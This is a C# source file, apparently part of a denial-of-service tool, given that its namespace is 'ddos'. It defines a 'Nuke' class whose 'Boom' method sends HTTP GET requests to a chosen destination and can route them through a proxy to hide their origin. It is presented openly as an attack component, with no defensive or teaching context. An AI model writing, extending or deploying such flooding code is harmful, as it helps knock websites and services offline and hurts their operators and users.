using ddos.Interfaces;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ddos.Silo
{
    public class Nuke : INuke
    {
        private readonly ILogger _logger;
        private readonly IHttpClientFactory _httpClientFactory;
        private readonly IServiceProvider _serviceProvider;
        public Nuke(ILogger<Nuke> logger,
             IServiceProvider serviceProvider,
             IHttpClientFactory httpClientFactory)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));            
            _httpClientFactory = httpClientFactory ?? throw new ArgumentNullException(nameof(httpClientFactory));
            _serviceProvider = serviceProvider ?? throw new ArgumentNullException(nameof(serviceProvider));
        }

        public async Task Boom(string destination, bool useProxy, CancellationToken cancellationToken)
        {
            _logger.LogTrace($"Bombing {destination}");
            HttpClient client = null;
            try
            {                
                if (useProxy)
                {
                    var handler = _serviceProvider.GetService<ProxyHttpHandler>();
                    client = new HttpClient(handler);
                }
                else
                    client =  _httpClientFactory.CreateClient("HttpClient");

                var response = await client.GetAsync(destination, cancellationToken);

                var s = await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex.Message, ex);
            }
            finally
            {
                if (useProxy)
                    client.Dispose();
            }
        }
    }
}
